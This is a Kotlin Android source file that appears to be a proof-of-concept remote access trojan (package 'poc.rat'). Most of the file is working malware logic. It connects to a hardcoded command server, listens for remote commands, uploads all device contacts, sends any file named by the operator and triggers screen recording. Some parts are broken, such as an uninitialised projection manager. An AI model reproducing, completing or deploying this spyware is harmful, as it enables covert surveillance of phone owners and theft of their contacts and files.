package poc.rat

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.ContactsContract
import android.telecom.ConnectionService
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.BufferedOutputStream
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.Socket

class MainActivity : AppCompatActivity() {
    // Server connection settings (hardcoded for local network)
    private val SERVER_IP = "192.168.1.24"
    private val SERVER_PORT = 3000

    // Socket-related objects for persistent connection
    private lateinit var serverSocket: Socket
    private lateinit var writer: PrintWriter
    private lateinit var reader: BufferedReader

    // Screen recording members
    companion object {
        private const val SCREEN_RECORD_REQUEST_CODE = 1001
    }
    private lateinit var mediaProjectionManager: MediaProjectionManager
    private var mediaProjection: MediaProjection? = null
    private lateinit var mediaRecorder: MediaRecorder
    private var virtualDisplay: VirtualDisplay? = null
    // Duration (in seconds) for screen recording when the "record" command is received.
    private var recordDurationSeconds: Int = 10

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
//        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        connectToServer()
        val serviceIntent = Intent(this, ConnectionService::class.java)
        startForegroundService(serviceIntent)
    }

    /**
     * Connect to the server on a background thread.
     */
    private fun connectToServer() {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                serverSocket = Socket(SERVER_IP, SERVER_PORT)
                writer = PrintWriter(serverSocket.getOutputStream(), true)
                reader = BufferedReader(InputStreamReader(serverSocket.getInputStream()))
                writer.println("phone connected")
                println("Connected to server, sent: phone connected")
                listenForCommands()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    /**
     * Listens for commands from the server in a loop.
     */
    private suspend fun listenForCommands() {
        while (true) {
            println("tryna listen")
            val command = withContext(Dispatchers.IO) {
                reader.readLine()
            } ?: break // Connection closed? Exit loop.
            println("Received command: $command")
            handleCommand(command)
        }
    }

    /**
     * Parse and handle commands.
     *
     * Supported commands:
     * - "record" : Record the screen for [recordDurationSeconds] seconds.
     * - "contacts" : Fetch contacts and send them back as a text message.
     * - "sendfile <filepath>" : Send the specified file.
     */
    private fun handleCommand(command: String) {
        // Assume commands are space-separated
        println(command)
        val parts = command.split(" ")
        println(parts[0].trim().lowercase())
        when (parts[0].trim().lowercase()) {
            "record" -> {
                runOnUiThread {
                    startScreenRecording(recordDurationSeconds)
                }
            }
            "contacts" -> {
                CoroutineScope(Dispatchers.IO).launch {
                    val contactsText = fetchContactsAsString()
                    writer.println("contacts\n$contactsText")
                    println("Contacts sent to server.")
                }
            }
            "sendfile" -> {
                if (parts.size > 1) {
                    val filePath = parts[1]
                    sendFileThroughSocket(filePath)
                } else {
                    println("sendfile command requires a file path parameter.")
                }
            }
            else -> {
                println("Unknown command: $command")
            }
        }
    }

    /**
     * Fetch contacts from the device and return them as a string.
     */
    private fun fetchContactsAsString(): String {
        val contactsList = mutableListOf<String>()
        val cursor: Cursor? = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
        cursor?.use {
            val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val phoneIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (it.moveToNext()) {
                val name = it.getString(nameIndex)
                val phone = it.getString(phoneIndex)
                contactsList.add("Name: $name, Phone: $phone")
            }
        }
        return contactsList.joinToString(separator = "\n")
    }

    /**
     * Sends a file located at the given file path over a new TCP connection.
     * (For simplicity, we open a new socket connection for file transfer.)
     */
    private fun sendFileThroughSocket(filePath: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val file = File(filePath)
                if (!file.exists()) {
                    println("File $filePath does not exist.")
                    return@launch
                }
                val fileBytes = file.readBytes()
                Socket(SERVER_IP, SERVER_PORT).use { socket ->
                    BufferedOutputStream(socket.getOutputStream()).use { outStream ->
                        outStream.write(fileBytes)
                        outStream.flush()
                    }
                }
                println("File sent successfully, size: ${fileBytes.size} bytes")
            } catch (e: Exception) {
                e.printStackTrace()
                println("Error sending file: ${e.message}")
            }
        }
    }

    // -----------------------------------------------
    // Screen recording functions using MediaProjection
    // -----------------------------------------------

    /**
     * Initiates the screen recording process by requesting user permission.
     */
    private fun startScreenRecording(durationSeconds: Int) {
        recordDurationSeconds = durationSeconds
        val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
        startActivityForResult(captureIntent, SCREEN_RECORD_REQUEST_CODE)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == SCREEN_RECORD_REQUEST_CODE) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data)
                setupMediaRecorder()
                startRecording()
                Handler(Looper.getMainLooper()).postDelayed({
                    stopRecording()
                }, recordDurationSeconds * 1000L)
            } else {
                println("Screen capture permission denied.")
            }
        }
        super.onActivityResult(requestCode, resultCode, data)
    }

    /**
     * Configures MediaRecorder with the desired settings.
     */
    private fun setupMediaRecorder() {
        mediaRecorder = MediaRecorder()
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE)
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        val outputFile = File(getExternalFilesDir(null), "screen_record_${System.currentTimeMillis()}.mp4")
        mediaRecorder.setOutputFile(outputFile.absolutePath)
        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
        mediaRecorder.setVideoSize(1080, 1920) // Adjust if needed.
        mediaRecorder.setVideoFrameRate(30)
        mediaRecorder.setVideoEncodingBitRate(5 * 1024 * 1024) // 5 Mbps.
        mediaRecorder.prepare()
    }

    /**
     * Starts screen recording by creating a VirtualDisplay linked to MediaRecorder.
     */
    private fun startRecording() {
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenRecording",
            1080, 1920,
            resources.displayMetrics.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            mediaRecorder.surface,
            null,
            null
        )
        mediaRecorder.start()
        println("Screen recording started.")
    }

    /**
     * Stops screen recording and releases resources.
     */
    private fun stopRecording() {
        try {
            mediaRecorder.stop()
            mediaRecorder.reset()
            println("Screen recording stopped.")
        } catch (e: Exception) {
            e.printStackTrace()
        }
        virtualDisplay?.release()
        mediaProjection?.stop()
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            serverSocket.close()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
